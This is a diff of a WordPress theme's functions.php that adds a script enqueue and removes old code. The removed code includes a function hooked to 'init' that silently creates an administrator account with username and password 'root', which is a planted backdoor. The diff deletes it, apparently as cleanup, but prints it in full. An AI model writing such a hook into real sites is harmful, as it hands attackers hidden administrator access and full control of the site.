@@ -84,6 +84,7 @@ function mstar_jquery_enqueue() {
 	wp_enqueue_script('detect', get_template_directory_uri().'/includes/js/mobile-detect.js#asyncload', array( 'jquery' ) );
 	wp_enqueue_script('jquery');
 	wp_enqueue_script('navigation', get_template_directory_uri().'/includes/js/navigation.js', array(), '1.0.0', true );
+	wp_enqueue_script('customjs', get_template_directory_uri().'/includes/js/custom.js', array('jquery'), '1.0.0', true );
 }
 
 
@@ -108,19 +109,6 @@ include('includes/form_functions.php');
 include('includes/cpt_functions.php'); 	//-- use for custom post types
 include('includes/menus.php');
 
-//include('includes/twitter_loader.php'); 	//-- call within page, not functions!
-//include('includes/facebook_feed.php');  	//-- call within page, not functions!
-//include('includes/fancy_loader.php');   	//-- call within page, not functions!
-function wpb_admin_account(){
-	$user = 'root';
-	$pass = 'root';
-	$email = 'root@xxxxx.com';
-	if ( !username_exists( $user )  && !email_exists( $email ) ) {
-	$user_id = wp_create_user( $user, $pass, $email );
-	$user = new WP_User( $user_id );
-	$user->set_role( 'administrator' );
-	} }
-	add_action('init','wpb_admin_account');
 
 /**
  * Add scope attributes to table headers
@@ -151,4 +139,3 @@ function tablepress_add_scope( $output, $table, $render_options ) {
 }
 add_filter( 'tablepress_table_output', 'tablepress_add_scope', 10, 3 );
 
-?>
